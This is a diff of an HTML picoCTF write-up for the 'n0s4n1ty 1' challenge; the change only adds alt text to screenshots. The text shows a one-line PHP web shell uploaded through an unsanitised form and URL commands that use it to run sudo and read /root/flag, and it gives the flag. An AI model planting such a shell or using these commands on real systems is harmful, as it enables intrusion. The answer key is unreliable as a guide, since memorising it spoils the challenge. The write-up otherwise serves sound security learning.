@@ -32,19 +32,19 @@ echo system($_GET['run']);
 ?&gt;</pre>
             <h2>Solution</h2>
             <p>So we'll open the website and enter the file with the php code we just did:</p>
-            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/1.png">
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/1.png" alt="Picture upload">
             <pre>The file nuh-sanitie.php has been uploaded Path: uploads/nuh-sanitie.php</pre>
             <p>Okay! And it actually worked, I guess because the level is called no sanity, that it doesn't really sanitize input and makes possible the upload of weird files like the one we just uploaded. So now we're gonna go to the file link they gave us and put it what we want to execute with sudo on the url. So first we'll execute what the second hint said, so sudo -l:</p>
             <pre>?run=sudo -l</pre>
-            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/2.png">
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/2.png" alt="run: sudo -l">
             <p>That doesn't seem to give us anything, so let's just continue with what the description says and look through the root directory:</p>
             <pre>?run=sudo ls -la /root</pre>
-            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/3.png">
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/3.png" alt="run: sudo ls -la /root">
             <p>It's a little unreadable because the spaces and new lines are all messed up because of HTML, so let's go into Ctrl+U to see view source so that it loads like it should:</p>
-            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/4.png">
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/4.png" alt="previous image with line-wrap">
             <p>Much better, now let's use cat to print the contents of the flag file:</p>
             <pre>?run=sudo cat /root/flag</pre>
-            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/5.png">
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/n0s4n1ty_1/5.png" alt="run: cat /root/flag.txt">
             <p>And the flag is:</p>
             <pre>picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}</pre>
             <p>There we go! That's the flag.</p>
